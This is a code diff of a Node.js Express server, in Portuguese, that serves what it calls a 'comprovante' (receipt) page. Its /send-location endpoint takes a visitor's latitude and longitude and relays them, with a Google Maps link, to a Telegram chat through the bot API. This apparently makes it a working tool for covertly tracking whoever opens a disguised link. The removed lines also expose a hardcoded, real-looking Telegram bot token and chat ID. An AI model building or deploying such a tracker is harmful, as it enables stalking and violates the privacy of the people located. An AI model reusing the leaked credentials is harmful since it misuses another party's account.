@@ -1,28 +1,41 @@
-// server.js
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
 const axios = require("axios");
+const path = require("path");
 
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, "public")));
+app.set("view engine", "ejs");
+app.set("views", path.join(__dirname, "views"));
 
-const TELEGRAM_BOT_TOKEN = "8007420259:AAG6trnekBRvW_a4umoRZUpiiC8686yOmuI"; // Substitua pelo token do seu bot
-const TELEGRAM_CHAT_ID = "4949747056"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+require("dotenv").config();
+const TELEGRAM_BOT_TOKEN = "TOKEN";
+const TELEGRAM_CHAT_ID = "-CHAT_ID";
 
-app.post("/send-location", async (req, res) => {
-  const { latitude, longitude, maps } = req.body;
+app.get("/", (req, res) => {
+  const dataAtual = new Date();
+  const dataFormatada = dataAtual.toLocaleDateString("pt-BR");
+  res.render("comprovante", { dataFormatada });
+});
 
-  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;
+app.get("/send-location", async (req, res) => {
+  if (!req.query.lat || !req.query.lon) {
+    return res.status(400).json({ success: false, message: "Localização não fornecida." });
+  }
+
+  const { lat, lon } = req.query;
+  const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+  const message = `Localização:\nLatitude: ${lat}\nLongitude: ${lon}\nMaps: ${maps}`;
 
   try {
-    // Envia a localização para o Telegram
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
     });
-
+    console.log("Mensagem enviada para o Telegram: %s\n", message);
     res.status(200).json({ success: true });
   } catch (error) {
     console.log(error);
